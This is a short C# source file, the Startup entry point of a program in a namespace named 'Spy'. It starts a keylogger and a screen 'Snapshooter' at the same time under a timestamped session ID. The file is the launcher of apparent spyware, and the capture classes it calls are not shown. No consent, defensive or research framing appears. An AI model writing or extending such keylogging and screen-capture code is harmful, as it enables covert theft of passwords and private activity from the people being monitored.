using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using HIT.Web.Infrastructure.Extensions;

namespace HIT.Desktop.Spy
{
    public class Startup
    {
        private static readonly string SessionId;
        private static readonly IList<IRunnable> Runnables;

        static Startup()
        {
            var date = DateTime.Now;
            var timeOfDay = date.TimeOfDay;
            var dateString = $"{date.Year}-{date.ToString("MMM")}-{date.Day}-{timeOfDay.Hours.ToTimeString()}-{timeOfDay.Minutes.ToTimeString()}-{timeOfDay.Seconds.ToTimeString()}";

            SessionId = $"{dateString}({Guid.NewGuid()})";
            Runnables = new List<IRunnable>();
        }

        public static void Main(string[] args)
        {
            var keylogger = new Keylogger(SessionId);
            var snapshooter = new Snapshooter(SessionId);

            Runnables.Add(keylogger);
            Runnables.Add(snapshooter);

            var keyloggerTask = Task.Run(() => keylogger.Start());
            var snapshooterTask = Task.Run(() => snapshooter.Start());

            Task.WaitAll(keyloggerTask, snapshooterTask);
        }
    }
}
